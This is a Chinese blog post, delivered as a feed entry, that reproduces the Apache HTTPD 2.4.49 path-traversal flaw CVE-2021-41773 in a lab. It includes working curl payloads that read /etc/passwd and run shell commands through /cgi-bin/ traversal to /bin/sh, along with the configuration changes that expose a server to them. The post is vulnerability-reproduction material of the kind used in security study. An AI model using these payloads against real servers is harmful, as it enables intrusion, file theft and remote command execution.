      <title>Apache HTTPD 路径穿越漏洞 CVE2021-41773</title>
      <link href="/2021/10/11/apache-httpd-cve2021-41773/"/>
      <url>/2021/10/11/apache-httpd-cve2021-41773/</url>
      
        <content type="html"><![CDATA[<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p><p>满足下面两个条件的Apache服务器将会受到影响：</p><ul><li>版本等于<code>2.4.49</code></li><li>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</li></ul><h2 id="搭建漏洞环境"><a href="#搭建漏洞环境" class="headerlink" title="搭建漏洞环境"></a>搭建漏洞环境</h2><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211013154427353.png" alt="漏洞环境Apache/2.4.49(Unix)"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1、文件读取"><a href="#1、文件读取" class="headerlink" title="1、文件读取"></a>1、文件读取</h3><p>Apache/2.4.49的配置文件httpd.conf中默认配置是不允许进行路径穿越访问的，其默认配置如下：</p><pre class="line-numbers language-httpd.conf" data-language="httpd.conf"><code class="language-httpd.conf">&lt;Directory /&gt;AllowOverride noneRequire all denied&lt;/Directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>将配置文件内容修改为如下：</p><pre class="line-numbers language-httpd.conf" data-language="httpd.conf"><code class="language-httpd.conf">&lt;Directory /&gt;AllowOverride noneRequire all granted&lt;/Directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用如下CURL命令来发送Payload：（其中 <code>icons</code> 目录默认是可以访问的）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://172.16.10.1:8080/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211013155301568.png" alt="文件读取"></p><h3 id="2、RCE"><a href="#2、RCE" class="headerlink" title="2、RCE"></a>2、RCE</h3><p>将httpd.conf文件中如下的配置取消注释</p><pre class="line-numbers language-httpd.conf" data-language="httpd.conf"><code class="language-httpd.conf">#LoadModule cgid_module modules/mod_cgid.so#LoadModule cgi_module modules/mod_cgi.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用如下CURL命令来发送Payload：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> --data <span class="token string">"echo;id"</span> <span class="token string">'http://172.16.10.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211013160238862.png" alt="命令执行"></p>]]></content>
      
      
